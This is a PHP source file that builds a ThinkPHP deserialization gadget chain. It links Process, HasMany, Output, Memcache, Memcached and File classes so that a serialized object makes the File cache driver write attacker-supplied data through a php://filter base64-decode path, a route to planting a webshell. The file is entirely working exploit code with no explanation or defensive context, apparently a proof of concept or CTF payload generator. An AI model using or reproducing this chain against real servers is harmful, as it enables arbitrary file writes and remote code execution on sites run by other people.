<?php
namespace think;


use think\model\relation\HasMany;

class Process
{
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct($path,$data){
        $this->processInformation['running']=true;
        $this->status=3;
        $this->processPipes=new HasMany($path,$data);
    }

}
 namespace think;
 class Model{

 }
 namespace think\model;


 use think\Model;
 class Merge extends Model{
     public $a='1';
     public function __construct()
     {
     }
 }



namespace think\model\relation;
use think\console\Output;
use think\db\Query;
use think\model\Merge;
use think\model\Relation;
class HasMany extends Relation
{
    //protected $baseQuery=true;
    protected $parent;
    protected $localKey='a';
    protected $pivot;
    protected $foreignKey;
    public function __construct($path,$data){
        $this->foreignKey='AAA'.$data;
        $this->query=new Output($path,$data);
        $this->parent= new Merge();

    }
}


namespace think\model;
class Relation
{}
namespace think\db;
class Query{}


namespace think\console;
class Output{
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct($path,$data)
    {
        $this->handle = (new \think\session\driver\Memcache($path,$data));
    }
}
namespace think\session\driver;
class Memcache
{
    protected $handler;
    public function __construct($path,$data)
    {
        $this->handler = (new \think\cache\driver\Memcached($path,$data));
    }
}


namespace think\cache\driver;

class Memcached
{
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct($path)
    {
        $this->tag = true;
        $this->options = [
            'expire'   => 0,
            'prefix'   => '',
        ];
        $this->handler = (new File($path));
    }
}

class File
{
    protected $tag;
    protected $options;
    public function __construct($path)
    {
        $this->tag = false;
        $this->options = [
            'expire'        => 3600,
            'cache_subdir'  => false,
            'prefix'        => '',
            'data_compress' => false,
            'path'          => 'php://filter/convert.base64-decode/resource='.$path,
        ];
    }
}
